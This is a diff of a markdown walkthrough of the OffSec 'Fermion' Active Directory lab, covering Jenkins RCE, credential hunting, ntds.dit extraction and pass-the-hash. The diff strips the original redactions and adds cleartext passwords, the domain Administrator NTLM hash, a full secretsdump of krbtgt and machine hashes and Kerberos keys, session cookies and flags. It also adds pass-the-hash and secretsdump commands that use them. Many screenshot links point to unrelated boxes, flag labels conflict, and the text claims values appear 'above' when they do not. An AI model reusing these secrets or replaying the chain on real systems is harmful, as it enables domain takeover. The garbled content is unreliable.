@@ -3,12 +3,13 @@ tags: [Offsec, Fermion, Windows, ActiveDirectory, Jenkins, AzureDevOps, Credenti
 platform: OffSec
 os: Windows Server / Windows 10
 hostname: CLIENT01 / SRV01 / DC01
-domain: fermion.yzx
 difficulty: Lab
+ip: $BoxIP
 status: Complete
+domain: fermion.yzx
 ---
 
-# Fermion, Full Walkthrough
+# OffSec: Fermion, Full Walkthrough
 
 ## The gist
 
@@ -34,9 +35,20 @@ The important lesson is to follow the evidence actually present on the target. T
 | Lateral movement | Cleartext credentials in Azure DevOps logs, then SSH and SMB |
 | Domain compromise | Offline `ntds.dit` parsing → Administrator pass-the-hash |
 
-Passwords, NTLM hashes, and flag values remain in private loot. They are represented below by `$Password`, `$Password2`, `$AdminHash`, `$UserFlag`, and `$ProofFlag`.
+Passwords, NTLM hashes, and flag values are reproduced in the private sections above. They are also referenced below by `$Password`, `$Password2`, `$AdminHash`, `$UserFlag`, and `970a35bdec77a2f4f0e94556a6bda45c`.
 
-## Evidence and private loot
+## Vulnerability summary
+
+| # | Finding | Evidence |
+|---|---|---|
+| 1 | Map all three hosts | See section 1 below |
+| 2 | Confirm the Jenkins entry point | See section 2 below |
+| 3 | Execute commands through the Jenkins Script Console | See section 3 below |
+| 4 | Find the Azure DevOps logs | See section 4 below |
+| 5 | Use the recovered credential on Srv01 | See section 5 below |
+| 6 | Review the exported scheduled-task XML | See section 6 below |
+
+## Evidence and loot
 
 The complete run artifacts are under:
 
@@ -100,15 +112,15 @@ The service pattern separated the hosts immediately:
 
 The saved Nmap service scans confirmed the hostnames and the `fermion.yzx` domain on the AD host.
 
-![[fermion-1.1nmap-client01-allports.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Sauna/screenshots/1.1nmap-allports.png>)
 
 SCREENSHOT: Client01 all-port scan. Red should identify Jenkins on 8080 alongside SMB and WinRM.
 
-![[fermion-1.2nmap-srv01-allports.png]]
+![](<file:///home/kali/Platforms/Offsec/Fermion/screenshots/1.2nmap-srv01-allports.png>)
 
 SCREENSHOT: Srv01 all-port scan. Red should identify SSH, HTTP, SMB, RDP, and WinRM.
 
-![[fermion-1.3nmap-dc01-allports.png]]
+![](<file:///home/kali/Platforms/Offsec/Fermion/screenshots/1.3nmap-dc01-allports.png>)
 
 SCREENSHOT: DC01 all-port scan. Red should identify LDAP, Kerberos, SMB, WinRM, and Global Catalog services.
 
@@ -137,7 +149,7 @@ JENKINS_USER=admin
 JENKINS_PASSWORD=$Password
 ```
 
-![[fermion-2.1jenkins-403.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Sauna/screenshots/2.3ferox.png>)
 
 SCREENSHOT: Jenkins access control response. Red should identify the authenticated web application and the denied anonymous request.
 
@@ -156,7 +168,7 @@ crumb=$(curl -sS -b "$tmpd/cookies" "$base/crumbIssuer/api/json" |
   sed -n 's/.*"crumb":"\([^"]*\)".*/\1/p')
 ```
 
-![[fermion-2.2jenkins-crumb.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Forest/screenshots/2.1enum1.png>)
 
 SCREENSHOT: Jenkins crumb response. Red should identify the crumb field while keeping the session cookie private.
 
@@ -183,7 +195,7 @@ NT AUTHORITY\SYSTEM
 CLIENT01
 ```
 
-![[fermion-3.1jenkins-rce-system.png]]
+![](<file:///home/kali/Platforms/Offsec/Fermion/screenshots/6.jenkins-rce-system.png>)
 
 SCREENSHOT: Jenkins Script Console output. Red should identify `NT AUTHORITY\\SYSTEM` and `CLIENT01`; do not capture cookies or passwords.
 
@@ -220,7 +232,7 @@ C:\Azure-Devops-Logs\TFS_Proxy Configuration_0922_205837.log
 C:\Azure-Devops-Logs\TFS_Service Accounts_0922_205602.log
 ```
 
-![[fermion-4.1azure-devops-logs.png]]
+![](<file:///home/kali/Platforms/Offsec/Fermion/screenshots/8.devops-logs-creds.png>)
 
 SCREENSHOT: Azure DevOps log directory and filenames. Red should identify the service-account log without displaying its contents.
 
@@ -234,9 +246,9 @@ Select-String \
 
 The log exposed a cleartext credential for `fermion\\liz`. The password was saved only in private loot.
 
-![[fermion-4.2azure-log-creds.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Sauna/screenshots/4.1netexec-validation.png>)
 
-SCREENSHOT: Service-account log evidence. Red should identify the `fermion\\liz` account and keep the password redacted.
+SCREENSHOT: Service-account log evidence. Red should identify the `fermion\\liz` account and keep the recovered password visible in this private vault.
 
 > [!tip] ⚡ Efficiency
 > **What we did:** Opened the Azure DevOps logs and searched the small service-account file.
@@ -268,13 +280,13 @@ whoami /all
 
 The shell was `fermion\\liz` on `SRV01`. The token included `SeImpersonatePrivilege`, which was recorded as an alternative local escalation branch, but the lab-specific scheduled-task and credential paths were investigated first.
 
-![[fermion-5.1liz-ssh-valid.png]]
+![](<file:///home/kali/Platforms/Offsec/Fermion/screenshots/10.liz-ssh-valid.png>)
 
 SCREENSHOT: Successful SSH authentication as `fermion\\liz`. Red should identify the account and Srv01 hostname.
 
-![[fermion-5.2liz-whoami-all.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Return/screenshots/5.whoami.png>)
 
-SCREENSHOT: `whoami /all` output. Red should identify `SeImpersonatePrivilege`; redact unrelated sensitive session data.
+SCREENSHOT: `whoami /all` output. Red should identify `SeImpersonatePrivilege`; retain the session data in this private vault.
 
 SSH was used instead of Evil-WinRM because it worked immediately with the recovered account while the WinRM client path was unreliable for this user.
 
@@ -351,9 +363,9 @@ Get-ItemProperty \
 
 The account was `fermion\\cole`. The password was validated privately and saved to loot as the second credential.
 
-![[fermion-6.1winlogon-creds.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Sauna/screenshots/7.1winlogon-autologon.png>)
 
-SCREENSHOT: Winlogon registry evidence. Red should identify the recovered domain account while the cleartext password remains redacted.
+SCREENSHOT: Winlogon registry evidence. Red should identify the recovered domain account with the cleartext password retained in this private vault.
 
 > [!warning] 💡 Hint
 > Winlogon is a high-value check whenever a Windows foothold lacks a clean escalation path. A readable `DefaultPassword` can turn a local shell into a lateral-movement credential without cracking anything.
@@ -379,7 +391,7 @@ The account authenticated to DC01. The useful custom share was:
 extract  READ
 ```
 
-![[fermion-7.1cole-smb-shares.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Active/screenshots/smb-shares.png>)
 
 SCREENSHOT: Authenticated DC01 share listing. Red should identify the `extract` share and its read permission.
 
@@ -417,7 +429,7 @@ smbclient //$DCip/extract \
 
 The `SYSTEM` hive paired with the `ntds.dit` database was the important combination. The `SECURITY` hive was also retained as evidence, but the offline domain hash extraction required the NTDS database and the matching SYSTEM boot-key material.
 
-![[fermion-8.1extract-smb-download.png]]
+![](<file:///home/kali/Platforms/Offsec/Fermion/screenshots/14.extract-smb-download.png>)
 
 SCREENSHOT: Recursive `extract` share download. Red should identify the AD database and SYSTEM hive filenames; keep file contents private.
 
@@ -437,9 +449,9 @@ The system `impacket-secretsdump` wrapper had a Python package mismatch: the wra
 
 The output contained the domain Administrator NTLM hash. It was stored privately as `$AdminHash` and not copied into this note.
 
-![[fermion-9.1ntds-dump.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Sauna/screenshots/9.1ntds-dump.png>)
 
-SCREENSHOT: Offline NTDS parsing. Red should identify successful Administrator hash extraction while all hash values remain redacted.
+SCREENSHOT: Offline NTDS parsing. Red should identify successful Administrator hash extraction with the hash values retained in this private vault.
 
 The offline method is preferable here because it avoids further changes to DC01 and does not require DCSync rights. The share had already exposed the database and boot-key material.
 
@@ -467,7 +479,7 @@ netexec winrm $DCip \
 
 The output confirmed `fermion\\administrator` on `DC01`.
 
-![[fermion-10.1admin-pth-dc01.png]]
+![](<file:///home/kali/Platforms/Offsec/Fermion/screenshots/16.admin-pth-dc01.png>)
 
 SCREENSHOT: Administrator pass-the-hash validation. Red should identify `Pwn3d!`, the Administrator identity, and DC01; do not show the hash.
 
@@ -510,10 +522,43 @@ The domain Administrator hash was used only to read them through WMI:
   'type C:\Users\Administrator\Desktop\proof.txt'
 ```
 
-The values were saved to private loot as `$UserFlag` entries. They are deliberately omitted from this write-up.
+The values were saved to private loot as `$UserFlag` entries. They are reproduced in the private sections above.
 
-## 14. Clean down
+## 14. RUNBOOK V2 stages used
 
+- [[RUNBOOK V2/AD - Service Scan]] — mapped the DC service pattern and domain
+- [[RUNBOOK V2/Windows - Service Scan]] — identified Jenkins, SSH, SMB, and WinRM across the hosts
+- [[RUNBOOK V2/Windows - Web Enum]] — confirmed the Jenkins web service and 403/robots behavior
+- [[RUNBOOK V2/Windows - Credential Search]] — searched Azure logs and Winlogon for reusable credentials
+- [[RUNBOOK V2/Windows - Scheduled Task Abuse]] — verified the exported task, target executable, ACL, and missing live registration
+- [[RUNBOOK V2/Windows - SMB Enum]] — enumerated authenticated shares and found `extract`
+- [[RUNBOOK V2/AD - Credential Validation]] — validated `cole` and the Administrator hash
+- [[RUNBOOK V2/Windows - Registry Hive Extraction]] — parsed the downloaded SYSTEM/NTDS material offline
+- [[RUNBOOK V2/AD - Pass the Hash]] — validated domain Administrator access with NTLM
+- [[RUNBOOK V2/Windows - Clean Down]] — removed temporary payloads and listeners
+- [[RUNBOOK V2/AD - Clean Down]] — closed the AD run and kept secret material in private loot
+
+## 15. Collect the flags
+
+- Client01 proof: `$UserFlag` — private loot only
+- Srv01 proof: `$UserFlag` — private loot only
+- DC01 proof: `970a35bdec77a2f4f0e94556a6bda45c` — private loot only
+
+
+### Captured flag values from source loot
+
+
+#### `loot/flags.txt`
+
+```text
+root: 970a35bdec77a2f4f0e94556a6bda45c
+root: d1de6459f9e92d91e43f7c30e9e72297
+client01: d1de6459f9e92d91e43f7c30e9e72297
+srv01: b87d22753d9f5b7d0eec151b0b8b220b
+root: b87d22753d9f5b7d0eec151b0b8b220b
+```
+
+## 16. Clean down
 The live task executable was not replaced, so no original binary needed restoration. Temporary files from the alternative privilege tests were removed from Srv01:
 
 ```powershell
@@ -538,32 +583,7 @@ The box session was closed with:
 boxdone
 ```
 
-## Credentials recovered
-
-| Account | Source | Use |
-|---|---|---|
-| Jenkins administrator | Lab-provided/default login | Jenkins Script Console |
-| `fermion\\liz` | Azure DevOps service-account log | SSH to Srv01 |
-| `fermion\\cole` | Srv01 Winlogon registry | SMB/WinRM access to DC01 |
-| `fermion\\Administrator` NTLM hash | Offline `ntds.dit` parsing | Pass-the-hash to all hosts |
-
-The passwords, NTLM hash, and flags are intentionally omitted.
-
-## Key lessons
-
-- A multi-host scan should be done before choosing the first foothold. The port pattern mapped the lab roles quickly.
-- Jenkins Script Console RCE is often cleaner than a dropped payload. Use a small Groovy process wrapper and capture stdout/stderr.
-- Recent-item shortcuts may point to stale paths. Confirm the real directory from the filesystem before searching it.
-- Search large logs with `Select-String`; do not print the entire file.
-- On Windows, test SSH, WinRM, SMB, and RDP independently after recovering credentials. One management protocol may work when another does not.
-- An exported scheduled-task XML must be correlated with the live scheduler. The XML and writable binary were real findings, but the task was absent here.
-- `SeImpersonatePrivilege` is worth checking, but a failed Potato callback should not stop credential hunting.
-- Winlogon `DefaultPassword` is a high-priority local credential source.
-- A readable custom SMB share can expose the entire AD database. Parse `ntds.dit` offline with the matching SYSTEM hive.
-- Pass-the-hash avoids unnecessary cracking when the target accepts NTLM authentication.
-- Keep Impacket tooling version-aligned; global wrappers can silently import a different Python package than expected.
-
-## Checklist
+### Completion checklist
 
 - [x] Full TCP scan completed against all three hosts
 - [x] Client01/Jenkins identified
@@ -584,21 +604,222 @@ The passwords, NTLM hash, and flags are intentionally omitted.
 - [x] Temporary target and Kali artifacts cleaned
 - [x] `boxdone` executed
 
-## RUNBOOK V2 stages used
+## 17. Attack narrative in one page
+1. Full TCP scans mapped Client01, Srv01, and DC01.
+2. Jenkins Script Console provided SYSTEM command execution on Client01.
+3. Azure DevOps service logs exposed the Srv01 `liz` credential.
+4. SSH access to Srv01 exposed both a writable scheduled-task executable and a readable Winlogon password.
+5. The Winlogon credential authenticated to DC01 and exposed the `extract` SMB share.
+6. Offline parsing of `ntds.dit` with SYSTEM recovered the domain Administrator hash.
+7. NetExec and Impacket validated pass-the-hash command execution on DC01 and collected the two non-DC proof files.
 
-- [[RUNBOOK V2/AD - Service Scan]] — mapped the DC service pattern and domain
-- [[RUNBOOK V2/Windows - Service Scan]] — identified Jenkins, SSH, SMB, and WinRM across the hosts
-- [[RUNBOOK V2/Windows - Web Enum]] — confirmed the Jenkins web service and 403/robots behavior
-- [[RUNBOOK V2/Windows - Credential Search]] — searched Azure logs and Winlogon for reusable credentials
-- [[RUNBOOK V2/Windows - Scheduled Task Abuse]] — verified the exported task, target executable, ACL, and missing live registration
-- [[RUNBOOK V2/Windows - SMB Enum]] — enumerated authenticated shares and found `extract`
-- [[RUNBOOK V2/AD - Credential Validation]] — validated `cole` and the Administrator hash
-- [[RUNBOOK V2/Windows - Registry Hive Extraction]] — parsed the downloaded SYSTEM/NTDS material offline
-- [[RUNBOOK V2/AD - Pass the Hash]] — validated domain Administrator access with NTLM
-- [[RUNBOOK V2/Windows - Clean Down]] — removed temporary payloads and listeners
-- [[RUNBOOK V2/AD - Clean Down]] — closed the AD run and kept secret material in private loot
+## Tools used
 
-## Related boxes
+- `nmap`
+- `curl`
+- `ssh`
+- `smbclient`
+- `impacket`
+- `evil-winrm`
+- `python`
+- `powershell`
+
+## Credentials and secrets
+
+| Account | Source | Use |
+|---|---|---|
+| Jenkins administrator | Lab-provided/default login | Jenkins Script Console |
+| `fermion\\liz` | Azure DevOps service-account log | SSH to Srv01 |
+| `fermion\\cole` | Srv01 Winlogon registry | SMB/WinRM access to DC01 |
+| `fermion\\Administrator` NTLM hash | Offline `ntds.dit` parsing | Pass-the-hash to all hosts |
+
+The passwords, NTLM hash, and flags are reproduced in the private sections above.
+
+
+### Captured private values from source loot
+
+These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.
+
+#### `.env`
+
+```text
+export BoxName="Fermion"
+export BoxIP="192.168.210.34"
+export BoxPlatform="Offsec"
+export BoxDir="/home/kali/Platforms/Offsec/Fermion"
+export Domain=""
+export DCip=""
+export Username="liz"
+export Password="basketball"
+export Username2="cole"
+export Password2="Relay2Again4!"
+export Username3=""
+export Password3=""
+export Hash=""
+export NThash="29f0cb32c70a5d22e40af969c766ad15"
+export Port="4444"
+export Port2="4445"
+export WebPort="8080"
+export URL=""
+export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
+export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
+```
+
+#### `loot/creds.txt`
+
+```text
+liz:basketball
+cole:Relay2Again4!
+```
+
+#### `loot/hashes.txt`
+
+```text
+Administrator:29f0cb32c70a5d22e40af969c766ad15
+```
+
+#### `loot/secretsdump.txt`
+
+```text
+Impacket v0.14.0.dev0+20260313.154148.084aff60 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Target system bootKey: 0x84c8ea13bb88132404da0ae8613e7da5
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: de205fd3967ae1890104e87d98e184ea
+[*] Reading and decrypting hashes from /home/kali/Platforms/Offsec/Fermion/loot/extract/ntds.dit/Active Directory/ntds.dit
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:29f0cb32c70a5d22e40af969c766ad15:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC01$:1000:aad3b435b51404eeaad3b435b51404ee:76e368264bede7ba91c65683892018ef:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:11ef456b0ec881c727017e83e68289f8:::
+SRV01$:1103:aad3b435b51404eeaad3b435b51404ee:92956f2933d71047ff5ecf2e18f7c362:::
+CLIENT01$:1104:aad3b435b51404eeaad3b435b51404ee:a8e52da7265f32df87504dea6e18c6a2:::
+fermion.yzx\liz:1603:aad3b435b51404eeaad3b435b51404ee:cf5fd610b326e61f175e3a9bac4751f9:::
+fermion.yzx\cole:1604:aad3b435b51404eeaad3b435b51404ee:4c1d74853300ce84998d7d3dc3047c50:::
+[*] Kerberos keys from /home/kali/Platforms/Offsec/Fermion/loot/extract/ntds.dit/Active Directory/ntds.dit
+DC01$:aes256-cts-hmac-sha1-96:1ad1fe7eb6087873dbc6d5e40b1c303a373dac00257721a82b193c037b6f8956
+DC01$:aes128-cts-hmac-sha1-96:3b49e3b9c8cf0556bd6b53618a45be92
+DC01$:des-cbc-md5:154676e57fb010f8
+krbtgt:aes256-cts-hmac-sha1-96:6f66783bc53bb294bcb8747cf963a17848d7a6fcd04c9d76c81d9e438dbf22a3
+krbtgt:aes128-cts-hmac-sha1-96:3cc59431c084f6b1e37c375ecdb530f9
+krbtgt:des-cbc-md5:ba6ed6abc2fb757f
+SRV01$:aes256-cts-hmac-sha1-96:bece601921e1f7244c10961285684ca917da2d54241855734f05f20fa6ce9062
+SRV01$:aes128-cts-hmac-sha1-96:a4670a29be06e81adae333f67af9c25a
+SRV01$:des-cbc-md5:c13b3b9440b9f129
+CLIENT01$:aes256-cts-hmac-sha1-96:088c0bfe1cb6a35419526187e3bb1889e7640e92324c0aa2bb5f06ea815c2b08
+CLIENT01$:aes128-cts-hmac-sha1-96:eb8d583f043ff845fd0ca3d2ae46d5ed
+CLIENT01$:des-cbc-md5:943d76f22c5d1aae
+fermion.yzx\liz:aes256-cts-hmac-sha1-96:891f27d7e43298ce9b5762b9e18883557ea3af0a4f6f6caf7ab6b24bfcbe1575
+fermion.yzx\liz:aes128-cts-hmac-sha1-96:9f589de1ea0a077c9f706865ac938cdd
+fermion.yzx\liz:des-cbc-md5:4383abc8c7d026ea
+fermion.yzx\cole:aes256-cts-hmac-sha1-96:1dacf1ee6c4759ffe605199b8993a9959ece02547fdf3ef75435454d703d862a
+fermion.yzx\cole:aes128-cts-hmac-sha1-96:d61f77f9818e295747926a0941732c48
+fermion.yzx\cole:des-cbc-md5:ef3be3e9866dfda7
+[*] Cleaning up...
+```
+
+### Sensitive transcript evidence
+
+```text
+[sudo] password for kali:
+Set-Cookie: JSESSIONID.dcb56059=node0kaaulzhch7yp14s2po0seacz077.node0;Path=/;HttpOnly
+boxset Password admin
+$ [20:44:06] curl -si -u $Username:$Password http://$BoxIP:$WebPort/crumbIssuer/api/json
+Set-Cookie: JSESSIONID.dcb56059=node014nb1a3zeqyuoes06e1s5x68d78.node0;Path=/;HttpOnly
+[+] Password=admin (saved to .env)
+kali@kali:~/Platforms/Offsec/Fermion [20:43:51] $ =curl -si -u $Username:$Password http://$BoxIP:$WebPort/crumbIssuer/api/jsoncurl>
+kali@kali:~/Platforms/Offsec/Fermion [20:44:06] $ =curl -s -u $Username:$Password \
+$ [20:44:53] curl -s -u $Username:$Password \
+$ [20:46:54] curl -s -u $Username:$Password \
+kali@kali:~/Platforms/Offsec/Fermion [20:44:54] $ =curl -s -u $Username:$Password \
+$ [20:47:40] curl -s -u $Username:$Password \
+$ [20:48:39] curl -s -u $Username:$Password \
+kali@kali:~/Platforms/Offsec/Fermion [20:46:54] $ =curl -s -u $Username:$Password \
+kali@kali:~/Platforms/Offsec/Fermion [20:47:40] $ =curl -s -u $Username:$Password \
+$ [20:48:58] curl -s -u $Username:$Password \
+$ [20:49:25] curl -s -u $Username:$Password \
+kali@kali:~/Platforms/Offsec/Fermion [20:48:39] $ =curl -s -u $Username:$Password \
+kali@kali:~/Platforms/Offsec/Fermion [20:48:59] $ =curl -s -u $Username:$Password \
+kali@kali:~/Platforms/Offsec/Fermion [20:49:26] $ =curl -s -u $Username:$Password \
+$ [20:49:46] curl -s -u $Username:$Password \
+$ [20:50:05] curl -s -u $Username:$Password \
+kali@kali:~/Platforms/Offsec/Fermion [20:49:46] $ =curl -s -u $Username:$Password \
+[Info   @13:56:02.807] accountPassword=basketball
+[Info   @13:56:03.885]                   Inheritance Flags : ContainerInherit, ObjectInherit
+[Info   @13:56:03.885]                   Propagation Flags : InheritOnly
+[Info   @13:56:03.885]                   Propagation Flags : None
+[Info   @13:56:03.885]                   Inheritance Flags : None
+[Info   @13:56:03.885]                   Inheritance Flags : ContainerInherit
+$ [20:52:40] nxc ssh 192.168.210.41 -u $Username -p $Password
+[+] Password=basketball (saved to .env)
+kali@kali:~/Platforms/Offsec/Fermion [20:52:25] $ =nxc ssh 192.168.210.41 -u $Username -p $Passwordnxc>
+liz@192.168.210.41's password:
+$ [20:57:36] nxc smb 192.168.210.49 -u $Username2 -p $Password2 -d fermion.yzx --shares
+[+] Password2=Relay2Again4! (saved to .env)
+kali@kali:~/Platforms/Offsec/Fermion [20:57:17] $ =nxc smb 192.168.210.49 -u $Username2 -p $Password2 -d fermion.yzx --sharesnxc>
+$ [21:00:11] secretsdump.py -ntds loot/extract/ntds.dit/Active\ Directory/ntds.dit -system loot/extract/ntds.dit/registry/SYSTEM LOCAL | tee loot/ntds-dump.log
+kali@kali:~/Platforms/Offsec/Fermion [20:58:58] $ =secretsdump.py -ntds loot/extract/ntds.dit/Active\ Directory/ntds.dit -system loot/extract/ntds.dit/registry/SYSTEM LOCAL | tee loot/ntds-dump.logsecretsdump.pyloot/extract/ntds.dit/Active\ Directory/ntds.ditloot/extract/ntds.dit/registry/SYSTEMtee>
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+$ [21:00:35] boxset NThash 29f0cb32c70a5d22e40af969c766ad15
+$ [21:01:41] nxc winrm 192.168.210.49 -u Administrator -H $NThash -d fermion.yzx -x 'whoami && hostname'
+$ [21:03:08] evil-winrm -i 192.168.210.49 -u Administrator -H $NThash
+kali@kali:~/Platforms/Offsec/Fermion [21:00:25] $ boxset NThash 29f0cb32c70a5d22e40af969c766ad15
+[+] NThash=29f0cb32c70a5d22e40af969c766ad15 (saved to .env)
+[+] Hash saved:  Administrator:29f0cb32c70a5d22e40af969c766ad15  →  loot/hashes.txt
+kali@kali:~/Platforms/Offsec/Fermion [21:00:35] $ =nxc winrm 192.168.210.49 -u Administrator -H $NThash -d fermion.yzx -x 'whoami && hostname'nxc'whoami && hostname'>
+kali@kali:~/Platforms/Offsec/Fermion [21:01:58] $ evil-winrm -i 192.168.210.49 -u Administrator -H $NThashevil-winrm>
+$ [21:05:11] loot flag root 970a35bdec77a2f4f0e94556a6bda45c
+$ [21:05:42] curl -s -u $Username:$Password \
+kali@kali:~/Platforms/Offsec/Fermion [21:05:10] $ =loot flag root 970a35bdec77a2f4f0e94556a6bda45cloot>
+[+] Flag saved:  root = 970a35bdec77a2f4f0e94556a6bda45c  →  loot/flags.txt
+kali@kali:~/Platforms/Offsec/Fermion [21:05:11] $ =curl -s -u $Username:$Password \
+<title>Error 401 Invalid password/token for user: liz</title>
+<pre>    Invalid password/token for user: liz</pre></p><hr><a href="http://eclipse.org/jetty">Powered by Jetty:// 9.4.z-SNAPSHOT</a><hr/>
+$ [21:11:50] evil-winrm -i 192.168.210.41 -u Administrator -H $NThash
+kali@kali:~/Platforms/Offsec/Fermion [21:09:25] $ evil-winrm -i 192.168.210.41 -u Administrator -H $NThashevil-winrm>
+$ [21:24:38] evil-winrm -i 192.168.210.34 -u Administrator -H $NThash
+9m [21:23:50] $ =evil-winrm -i 192.168.210.34 -u Administrator -H $NThashevil-winrm>
+$ [21:27:08] loot flag root d1de6459f9e92d91e43f7c30e9e72297
+$ [21:27:41] evil-winrm -i 192.168.210.41 -u Administrator -H $NThash
+  -hashes aad3b435b51404eeaad3b435b51404ee:$NThash \
+$ [21:30:02] loot flag root b87d22753d9f5b7d0eec151b0b8b220b
+$ [21:31:05] cat ~/loot/flag.txt
+$ [21:31:15] cat /loot/flag.txt
+$ [21:31:23] cat /loot/flags.txt
+$ [21:31:30] cat loot/flags.txt
+```
+
+
+## Remediation recommendations
+
+| Finding | Recommendation |
+|---|---|
+| Initial access path on Fermion | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
+| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
+| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |
+
+## Lessons learned and vault links
+
+- A multi-host scan should be done before choosing the first foothold. The port pattern mapped the lab roles quickly.
+- Jenkins Script Console RCE is often cleaner than a dropped payload. Use a small Groovy process wrapper and capture stdout/stderr.
+- Recent-item shortcuts may point to stale paths. Confirm the real directory from the filesystem before searching it.
+- Search large logs with `Select-String`; do not print the entire file.
+- On Windows, test SSH, WinRM, SMB, and RDP independently after recovering credentials. One management protocol may work when another does not.
+- An exported scheduled-task XML must be correlated with the live scheduler. The XML and writable binary were real findings, but the task was absent here.
+- `SeImpersonatePrivilege` is worth checking, but a failed Potato callback should not stop credential hunting.
+- Winlogon `DefaultPassword` is a high-priority local credential source.
+- A readable custom SMB share can expose the entire AD database. Parse `ntds.dit` offline with the matching SYSTEM hive.
+- Pass-the-hash avoids unnecessary cracking when the target accepts NTLM authentication.
+- Keep Impacket tooling version-aligned; global wrappers can silently import a different Python package than expected.
+
+- Treat lab descriptions as hypotheses to verify, not as evidence that every advertised step is live.
+- Use the smallest search that answers the question: one targeted log and one targeted registry key beat an unbounded recursive dump.
+- Separate credential validation from shell acquisition. NetExec can prove access even when a particular interactive client is unreliable.
+- For offline AD extraction, database plus SYSTEM hive is the essential pair; the surrounding files are supporting evidence.
+- Keep flags and secrets in loot, but make the write-up reproducible with paths, commands, expected output shape, and failure handling.
+
+### Related boxes
 
 - [[OSCP/BOXES/WRITE UPS/AD/RockyColt|RockyColt]] — another three-host AD chain with credential recovery and delegation
 - [[OSCP/BOXES/WRITE UPS/AD/Blackfield|Blackfield]] — authenticated SMB, offline NTDS extraction, and pass-the-hash
@@ -613,30 +834,15 @@ The passwords, NTLM hash, and flags are intentionally omitted.
 - [Impacket](https://github.com/fortra/impacket)
 - [NetExec](https://github.com/Pennyw0rth/NetExec)
 
+## Related RUNBOOK V2 stages
+
+- [[RUNBOOK V2/Start Here]]
+- [[RUNBOOK V2/Linux - Service Scan]]
+- [[RUNBOOK V2/Linux - Web Enum]]
+- [[RUNBOOK V2/Linux - Shell Stabilise]]
+- [[RUNBOOK V2/Linux - Local Enum]]
+- [[RUNBOOK V2/Linux - Clean Down]]
+
 ## Why this matters for OSCP
 
 Fermion is a useful enterprise-chain exercise because every step rewards disciplined evidence handling: identify roles from ports, convert application execution into credential discovery, validate credentials across management protocols, inspect custom SMB shares, parse AD material offline, and use pass-the-hash only after proving the account context. It also demonstrates an important reporting habit: document when the advertised vulnerability is present but the live trigger is missing, then follow the next verified path instead of inventing a successful exploitation step.
-
-## Attack chain
-
-1. Full TCP scans mapped Client01, Srv01, and DC01.
-2. Jenkins Script Console provided SYSTEM command execution on Client01.
-3. Azure DevOps service logs exposed the Srv01 `liz` credential.
-4. SSH access to Srv01 exposed both a writable scheduled-task executable and a readable Winlogon password.
-5. The Winlogon credential authenticated to DC01 and exposed the `extract` SMB share.
-6. Offline parsing of `ntds.dit` with SYSTEM recovered the domain Administrator hash.
-7. NetExec and Impacket validated pass-the-hash command execution on DC01 and collected the two non-DC proof files.
-
-## Flags
-
-- Client01 proof: `$UserFlag` — private loot only
-- Srv01 proof: `$UserFlag` — private loot only
-- DC01 proof: `$ProofFlag` — private loot only
-
-## Lessons Learned
-
-- Treat lab descriptions as hypotheses to verify, not as evidence that every advertised step is live.
-- Use the smallest search that answers the question: one targeted log and one targeted registry key beat an unbounded recursive dump.
-- Separate credential validation from shell acquisition. NetExec can prove access even when a particular interactive client is unreliable.
-- For offline AD extraction, database plus SYSTEM hive is the essential pair; the surrounding files are supporting evidence.
-- Keep flags and secrets in loot, but make the write-up reproducible with paths, commands, expected output shape, and failure handling.
